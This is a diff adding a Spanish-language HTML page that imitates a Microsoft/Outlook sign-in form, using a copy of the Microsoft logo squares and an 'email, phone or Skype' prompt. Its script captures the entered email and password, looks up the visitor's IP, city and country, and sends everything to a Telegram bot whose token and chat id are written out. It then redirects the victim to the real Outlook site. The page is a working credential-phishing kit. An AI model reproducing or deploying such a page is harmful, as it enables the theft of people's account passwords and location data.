@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        background-image: url("fondo.jpg"); /* Ruta de tu imagen de fondo */
+        background-size: cover; /* La imagen se ajusta para cubrir toda la pantalla */
+        background-repeat: no-repeat; /* La imagen no se repite */
+        background-position: center center; /* La imagen se centra tanto vertical como horizontalmente */
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; /* Tipo de fuente de texto */
+        color: #000000; /* Color del texto */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      form {
+        width: 80%; /* Ancho del formulario */
+        max-width: 400px; /* Máximo ancho en dispositivos móviles */
+        background-color: #fff;
+        padding: 40px;
+
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      /* Estilos adicionales para dispositivos móviles */
+      @media (max-width: 768px) {
+        form {
+          width: 100%;
+          border-radius: 0; /* Sin bordes redondeados en dispositivos móviles */
+        }
+      }
+      .grid-container {
+        display: grid;
+        grid-template-columns: repeat(2, 2px);
+        grid-template-rows: repeat(2, 2px);
+        gap: 10px;
+      }
+
+      .grid-item {
+        width: 10px;
+        height: 10px;
+      }
+      input:focus {
+        border-color: rgb(
+          58,
+          133,
+          163
+        ); /* Cambia el color del borde inferior al seleccionar */
+        outline: none; /* Elimina el contorno predeterminado al seleccionar */
+      }
+    </style>
+  </head>
+  <body>
+    <form id="login-form">
+      <div class="grid-container">
+        <div class="grid-item" style="background-color: rgb(242, 80, 34)"></div>
+        <div class="grid-item" style="background-color: rgb(127, 186, 0)"></div>
+        <div class="grid-item" style="background-color: rgb(0, 164, 239)"></div>
+        <div class="grid-item" style="background-color: rgb(255, 185, 0)"></div>
+      </div>
+      <h2>Iniciar sesión</h2>
+      <input
+        type="email"
+        style="
+          width: 100%;
+          border: 0;
+          border-bottom: 1px solid black;
+          padding: 5px;
+        "
+        id="email"
+        placeholder="Correo electrónico, teléfono o Skype"
+      />
+      <div style="height: 20px"></div>
+      <input
+        type="password"
+        style="
+          width: 100%;
+          border: 0;
+          border-bottom: 1px solid black;
+          padding: 5px;
+        "
+        id="password"
+        placeholder="Contraseña "
+      />
+
+      <div style="height: 10px"></div>
+      <div>
+        <h6>
+          ¿No tiene una cuenta?
+          <a href="#" style="color: rgb(0, 103, 184); text-decoration: none"
+            >Cree una.</a
+          >
+        </h6>
+      </div>
+      <div style="text-align: right">
+        <button
+          style="
+            background: rgb(0, 103, 184);
+            padding: 6px;
+            color: white;
+            border: 0;
+          "
+        >
+          Iniciar Sesión
+        </button>
+      </div>
+    </form>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#login-form");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const email = document.querySelector("#email").value;
+          const password = document.querySelector("#password").value;
+          const message =
+            "Correo: " +
+            email +
+            " Contra: " +
+            password +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot6901771254:AAF2YxrBOr6Hbpt-tfCzynZgbF63fGcyDvo/sendMessage",
+              {
+                chat_id: "-4113327702",
+                text: message,
+              }
+            )
+            .then((response) => {
+              console.log(response.data);
+              window.location.href = "https://outlook.live.com/owa/";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
